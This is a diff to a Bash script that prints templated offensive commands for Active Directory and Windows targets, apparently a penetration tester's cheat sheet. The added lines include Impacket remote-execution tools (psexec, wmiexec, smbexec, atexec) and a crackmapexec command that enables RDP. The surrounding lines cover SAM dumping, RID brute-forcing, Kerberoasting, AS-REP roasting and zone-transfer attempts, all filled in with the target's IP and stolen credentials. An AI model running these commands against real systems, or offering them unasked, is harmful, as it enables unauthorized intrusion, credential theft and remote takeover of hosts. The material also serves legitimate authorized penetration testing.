@@ -16,13 +16,59 @@ NQDomain="";	#
 IP="";		#
 NQIP="";	#
 LDAP="";	#
+baseLDAP="";	#
 DC="";		#
 NS="IP";	#
 GC="";		#
 
 
 # Wordlists
-UserList="'/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'"
+UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
+
+################################################################################
+# Colors                                                                    #
+################################################################################
+
+RESTORE='\033[0m'
+
+RED='\033[00;31m'
+GREEN='\033[00;32m'
+YELLOW='\033[00;33m'
+BLUE='\033[00;34m'
+PURPLE='\033[00;35m'
+CYAN='\033[00;36m'
+LIGHTGRAY='\033[00;37m'
+
+LRED='\033[01;31m'
+LGREEN='\033[01;32m'
+LYELLOW='\033[01;33m'
+LBLUE='\033[01;34m'
+LPURPLE='\033[01;35m'
+LCYAN='\033[01;36m'
+WHITE='\033[01;37m'
+
+IBLUE='\033[02;34m'
+ICYAN='\033[02;36m'
+
+###############################################################################
+# Help                                                                         #
+################################################################################
+
+Help()
+{
+   # Display Help
+   echo "Add description of the script functions here."
+   echo
+   echo "Syntax: scriptTemplate [-g|h|v|V]"
+   echo "options:"
+   echo "n     Displays commands for when credentials are not known."
+   echo "c     Displays many crackmapexec commands."
+   echo "i     Sets the target IP address."
+   echo "h     Print this Help."
+   echo "v     Verbose mode."
+   echo "V     Print software version and exit."
+   echo
+}
 
 ################################################################################
 # Options                                                                      #
@@ -64,7 +110,19 @@ while [ $# -gt 0 ]; do
                 NQDomain="$2";
                 shift
                 shift
-                ;;                                                                                           
+                ;;
+                
+        -l | --LDAP)
+                LDAP="'$2'";
+                shift
+                shift
+                ;;          
+                
+        -h | --help)
+                Help;
+                shift
+                shift
+                ;;                                                                                                                          
                 
         *)
                 POSITIONAL="${POSITIONAL} $1"
@@ -72,51 +130,6 @@ while [ $# -gt 0 ]; do
                 ;;
         esac
 done
-
-###############################################################################
-# Help                                                                         #
-################################################################################
-
-Help()
-{
-   # Display Help
-   echo "Add description of the script functions here."
-   echo
-   echo "Syntax: scriptTemplate [-g|h|v|V]"
-   echo "options:"
-   echo "n     Displays commands for when credentials are not known."
-   echo "c     Displays many crackmapexec commands."
-   echo "i     Sets the target IP address."
-   echo "h     Print this Help."
-   echo "v     Verbose mode."
-   echo "V     Print software version and exit."
-   echo
-}
-
-################################################################################
-# Colors                                                                    #
-################################################################################
-
-RESTORE='\033[0m'
-
-RED='\033[00;31m'
-GREEN='\033[00;32m'
-YELLOW='\033[00;33m'
-BLUE='\033[00;34m'
-PURPLE='\033[00;35m'
-CYAN='\033[00;36m'
-LIGHTGRAY='\033[00;37m'
-
-LRED='\033[01;31m'
-LGREEN='\033[01;32m'
-LYELLOW='\033[01;33m'
-LBLUE='\033[01;34m'
-LPURPLE='\033[01;35m'
-LCYAN='\033[01;36m'
-WHITE='\033[01;37m'
-
-IBLUE='\033[02;34m'
-ICYAN='\033[02;36m'
 
 ################################################################################
 # Banner                                                                     #
@@ -160,8 +173,11 @@ echo -e ""
 echo -e "${IBLUE}DNSenum${RESTORE}"
 echo -e "dnsenum --dnsserver $IP --enum $Domain"
 echo -e ""
+echo -e "${IBLUE}DNSrecon${RESTORE}"
+echo -e "dnsrecon -d $Domain"
+echo -e ""
 echo -e "${IBLUE}Dig${RESTORE}"
-echo -e "dig AXFR $Domain @$IP"
+echo -e "dig AXFR $Domain @$NQIP"
 echo -e ""
 echo -e "${IBLUE}Fierce${RESTORE}"
 echo -e "fierce -dns $Domain"
@@ -230,7 +246,7 @@ echo -e "crackmapexec smb $IP -u $Username -p $Password --users"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --sessions"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --disks"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users"
-echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute 2000"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
 echo -e ""
@@ -286,6 +302,13 @@ echo -n -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -f
 echo -e ""
 echo -e "${IBLUE}GetUserSPNs${RESTORE}"
 echo -n -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP" ;echo -e " ${YELLOW}# Requires valid credentials${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Execution Methods${RESTORE}"
+echo -e "atexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "psexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "smbexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "wmiexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e ""
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 echo -e ""
@@ -297,6 +320,9 @@ echo -e "${IBLUE}xFreeRDP${RESTORE}"
 echo -e "xfreerdp /v:$IP /u:$Username /p:$Password"
 echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard"
 echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -M rdp -o ACTION=enable" ;echo -e " ${YELLOW}# Enable RDP${RESTORE}"
 echo -e ""
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
